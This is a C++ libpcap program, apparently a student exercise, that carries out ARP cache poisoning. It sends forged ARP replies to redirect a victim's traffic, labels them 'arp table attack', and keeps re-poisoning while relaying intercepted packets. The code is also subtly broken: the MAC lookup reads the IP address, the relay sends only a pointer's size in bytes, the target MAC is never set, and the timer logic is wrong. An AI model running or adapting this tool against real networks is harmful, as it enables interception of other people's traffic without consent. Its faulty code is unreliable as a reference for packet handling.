#include<pcap.h>
#include<stdio.h>
#include<stdint.h>
#include<arpa/inet.h>
#include<string.h>
#include<cstdlib>
#include<sys/types.h>
#include<sys/socket.h>
#include <netinet/ip.h> 
#include <netinet/ether.h>
#include <sys/types.h>        
#include <sys/socket.h>       
#include <linux/if_ether.h>   
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include<vector>
#include<time.h>

using namespace std;

struct adr_struct{
	u_char trg_ip[4];
	u_char trg_mac[6];
	u_char sender_ip[4];
	u_char sender_mac[6];
};

struct arp_struct{
	uint16_t h_type=ntohs(0x0001);
	uint16_t p_type=ntohs(0x0800);
	uint16_t hp_len=0x0604;
	uint16_t op;
	u_char src_mac[6];
	u_char src_ip[4];
	u_char dest_mac[6];
	u_char dest_ip[4];
	
};

struct eth_struct{
	u_char dest_adr[6];
	u_char src_adr[6];
	uint16_t eth_type=ntohs(0x0806);
	arp_struct arp;
};

void arp_send(u_char* src_ip,u_char* src_mac,u_char* dest_ip,u_char* dest_mac,pcap_t* handle){
	
	struct eth_struct eth;
	memcpy(eth.dest_adr, dest_mac,6);
	memcpy(eth.src_adr, src_mac,6);
	u_char defined[8]={0x00,0x01,0x08,0x00,0x06,0x04,0x00,0x02};
	memcpy(&eth.arp,defined,8);
	memcpy(eth.arp.src_mac,src_mac,6);
	memcpy(eth.arp.src_ip,src_ip,4);
	memcpy(eth.arp.dest_mac,dest_mac,6);
	memcpy(eth.arp.dest_ip, dest_ip, 4);
	
	uint8_t* packet = (uint8_t *)malloc(sizeof(struct eth_struct));
	memcpy(packet,&eth,sizeof(struct eth_struct));
	pcap_sendpacket(handle,packet,sizeof(struct eth_struct));
	free(packet);
}


void arp_reply(u_char* src_ip,u_char* src_mac,u_char* dest_ip,u_char* dest_mac,pcap_t* handle){
	
	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) 
			continue;
		if (res == -1 || res == -2) 
			break;
			
		struct eth_struct eth;
		memcpy(&eth,packet,sizeof(eth_struct));
		if(eth.eth_type==htons(0x0806)){
			memcpy(dest_mac, eth.arp.src_mac, 6);
			break;
		}
	}
}	


void arp_request(u_char* my_ip,u_char* my_mac,u_char* sender_ip, pcap_t* handle){
	struct eth_struct eth;
	memset(eth.dest_adr, 0xff,6);
	memcpy(eth.src_adr,my_mac,6);
	u_char defined[8]={0x00,0x01,0x08,0x00,0x06,0x04,0x00,0x01};
	memcpy(&eth.arp,defined,8);
	memcpy(eth.arp.src_mac,my_mac,6);
	memcpy(eth.arp.src_ip,my_ip,4);
	memset(eth.arp.dest_mac,0x00,6);
	memcpy(eth.arp.dest_ip, sender_ip, 4);
	
	uint8_t* packet = (uint8_t *)malloc(sizeof(eth_struct));
	memcpy(packet,&eth,sizeof(struct eth_struct));
	pcap_sendpacket(handle,packet,sizeof(struct eth_struct));
	free(packet);
}

void get_my_mac(uint8_t * my_mac, char * interface) {
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	}
	else {
		//		inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ipstr, sizeof(struct sockaddr));
		memcpy(my_mac, ifr.ifr_addr.sa_data, 6);
	}
}

void get_my_ip(uint8_t * my_ip, char * interface) {
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	}
	else {
		//inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ipstr, sizeof(struct sockaddr));
		memcpy(my_ip, ifr.ifr_addr.sa_data + 2, 4);
	}
}

int main(int argc, char* argv[])
{
	if (argc%2!=0){
		printf("usage : ./send-arp <interface> <sender ip1> <target ip1>...");
		return -1;
	}
	vector<adr_struct> address;
	u_char my_ip[4];
	u_char my_mac[6];
	
	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	printf("start!\n");
	get_my_ip(my_ip, argv[1]); // made by google
	get_my_mac(my_mac, argv[1]); // made by google
	
	int t;
	for(t=2;t<argc;t+=2){
		struct adr_struct adr;
		uint32_t tmp = inet_addr(argv[t]);
		memcpy(adr.sender_ip, &tmp, 4);
		tmp=inet_addr(argv[t+1]);
		memcpy(adr.trg_ip,&tmp,4);
		arp_request(my_ip,my_mac,adr.sender_ip,handle); //sender_mac request
		arp_reply(my_ip,my_mac,adr.sender_ip,adr.sender_mac,handle); //get sender_mac
		arp_send(adr.trg_ip,my_mac,adr.sender_ip,adr.sender_mac,handle); //arp table attack
		address.push_back(adr);
	}
	printf("Attack Finished\n");
	
	while(1){
		
		clock_t start=clock();
		struct pcap_pkthdr* header;
		struct eth_struct eth;
		const u_char* packet;
		printf("1\n");
		int res = pcap_next_ex(handle, &header, &packet);
		
		memcpy(&eth,packet,sizeof(struct eth_struct));
		
		if(eth.eth_type==htons(0x0800)){ 		//sfoofed packet
			for(int k=0; k<(argc/2); k++){
				if((memcmp(eth.dest_adr,my_mac,6)==0)&&(memcmp(eth.arp.dest_ip,address[k].trg_ip,4)==0)){
					memcpy(eth.src_adr,address[k].trg_mac,6);
					pcap_sendpacket(handle,packet,sizeof(packet));
				}
			}
		}
		
		if(eth.eth_type==htons(0x0806)){ 		//arp request
			for(int k=0; k<(argc/2); k++){
				int cnt=0;
				for(int i=0 ; i<6; i++)
					if(eth.dest_adr[i]==0xff)
						cnt++;
				if((cnt==6)&&(memcmp(eth.arp.dest_ip,address[k].trg_ip,4)==0)&&(memcmp(eth.arp.src_ip,address[k].sender_ip,4)==0))
					arp_send(address[k].trg_ip,my_mac,address[k].sender_ip,address[k].sender_mac,handle);
			}
		}
		
		double count=clock()-start;
		if(count>10000){ 		// arp_send per 10sec
			for(int k=0; k<(argc/2); k++)
				arp_send(address[k].trg_ip,my_mac,address[k].sender_ip,address[k].sender_mac,handle);
			count-=10000;
		}
	}
	pcap_close(handle);
	return 0;
	
}
